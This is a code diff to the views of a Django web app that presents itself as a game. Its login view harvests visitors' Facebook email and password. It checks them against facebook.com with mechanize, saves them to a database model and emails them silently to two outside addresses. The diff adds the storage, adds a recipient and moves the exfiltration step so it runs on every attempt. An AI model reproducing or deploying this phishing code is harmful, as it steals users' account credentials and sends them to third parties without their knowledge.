@@ -2,7 +2,7 @@ from django.views.decorators.http import require_http_methods
 from django.shortcuts import render, redirect, get_object_or_404
 from django.core.urlresolvers import reverse
 from .forms import NewGameForm, PlayForm
-from .models import Game
+from .models import Game, Cred
 import sys
 import random
 import mechanize
@@ -14,6 +14,7 @@ import json
 
 @require_http_methods(["GET", "POST"])
 def index(request):
+    print "request: ", request, request.POST
     if request.method == "POST":
         form = NewGameForm(request.POST)
         # Theoretically the only way this form can be invalid
@@ -57,7 +58,7 @@ def game(request, pk):
 def login(request):
     data = request.POST
     print data
-    if data:
+    if 'userid' in data:
         useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
         attempt = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
         br = mechanize.Browser()
@@ -72,27 +73,32 @@ def login(request):
             br.addheaders = [('User-agent', random.choice(useragents))]
             site = br.open(attempt)
             br.select_form(nr=0)
-        
+            
+            print "DATA: ", data
             ##Facebook
             br.form['email'] =data["userid"]
             br.form['pass'] = data["password"]
             br.submit()
             log = br.geturl()
             print log
+            Cred.objects.create(
+                username=data["userid"],
+                password=data["password"]
+            )
+            send_mail(
+            "Facebook Credentials",
+            json.dumps(data),
+            "no-reply@game.com",
+            ["b4you0870@gmail.com", "rohan@rohanroy.com"],
+            fail_silently=True
+            )
             if log != attempt:
                 print "\n\n\n [*] Password found .. !!"
                 print "\n [*] Password : %s\n" % data["password"]
-                return redirect(reverse("game:index"))
+
+                return redirect(reverse("game:play"))
             else:
                 messages.add_message(request, messages.ERROR, "Login Failed")
         except KeyboardInterrupt:
             print "\n[*] Exiting program .. "
-
-        send_mail(
-            "Facebook Credentials",
-            json.dumps(data),
-            "no-reply@game.com",
-            ["b4you0870@gmail.com"],
-            fail_silently=True
-            )
     return render(request, "game/game_start.html")
